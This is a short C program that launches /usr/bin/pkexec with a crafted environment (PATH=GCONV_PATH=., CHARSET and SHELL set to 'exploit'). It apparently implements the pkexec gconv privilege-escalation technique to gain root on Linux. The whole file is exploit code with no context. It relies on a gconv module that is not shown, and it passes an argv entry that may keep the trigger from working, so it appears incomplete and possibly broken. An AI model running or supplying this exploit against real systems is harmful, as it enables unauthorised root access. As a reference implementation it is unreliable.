#include <unistd.h>

int main() {
    char *env[] = {
        "exploit",
        "PATH=GCONV_PATH=.",
        "CHARSET=exploit",
        "SHELL=exploit",
        NULL
    };
    execve("/usr/bin/pkexec", (char *[]){ "pkexec", NULL }, env);
    return 0;
}
